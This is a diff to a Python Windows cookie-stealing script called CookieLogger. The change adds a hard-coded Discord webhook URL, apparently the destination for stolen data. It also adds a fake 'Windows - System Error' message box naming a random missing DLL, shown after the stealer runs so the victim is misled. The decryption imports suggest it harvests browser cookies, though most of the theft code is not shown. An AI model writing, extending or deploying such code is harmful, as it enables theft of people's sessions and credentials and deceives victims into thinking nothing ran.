@@ -1,7 +1,10 @@
-webhook = "" # WEBHOOK HERE
+webhook = "https://discord.com/api/webhooks/1097208095786143774/W1GYzRAiTUcOS-4TQE2ov1tGnheyV2Q8JXAeo8qyzeF2mJYH2U8ZQPdUUPaOytzXxaBS" # WEBHOOK HERE
 
 import os
 import json
+import ctypes
+import random
+import string
 import base64
 import shutil
 import sqlite3
@@ -11,6 +14,8 @@ import subprocess
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES 
 
+show_fake_error: bool = True
+
 def safe(func):
     def wrapper(*args, **kwargs):
         try:
@@ -19,8 +24,15 @@ def safe(func):
             pass
     return wrapper
 
-class CookieLogger:
+def dll_name() -> str:
+    dll_list = ['kernel32.dll', 'user32.dll', 'advapi32.dll', 'msvcrt.dll', 'gdi32.dll', 'comdlg32.dll', 'shell32.dll', 'ole32.dll', 'oleaut32.dll', 'wininet.dll', 'winspool.drv', 'urlmon.dll', 'uuid.dll', 'mpr.dll', 'netapi32.dll', 'version.dll', 'crypt32.dll', 'ws2_32.dll', 'msvcp140.dll', 'vcruntime140.dll', 'shlwapi.dll', 'secur32.dll', 'dbghelp.dll', 'imm32.dll', 'usp10.dll', 'kernelbase.dll', 'userenv.dll', 'cfgmgr32.dll', 'devobj.dll', 'setupapi.dll']
+    
+    return random.choice(dll_list)
 
+def fake_error_message_box() -> bool:
+    ctypes.windll.user32.MessageBoxW(None, f"This application failed to start because {dll_name()} was not found. Re-installing the application may fix this problem.", "Windows - System Error", 0)
+
+class CookieLogger:
     appdata = os.getenv('APPDATA')
     localappdata = os.getenv('LOCALAPPDATA')
 
@@ -161,3 +173,12 @@ class CookieLogger:
 
 if __name__ == "__main__":
     CookieLogger()
+    
+    if show_fake_error == True:
+        try:
+            fake_error_message_box()
+        except:
+            pass
+    else:
+        pass
+    
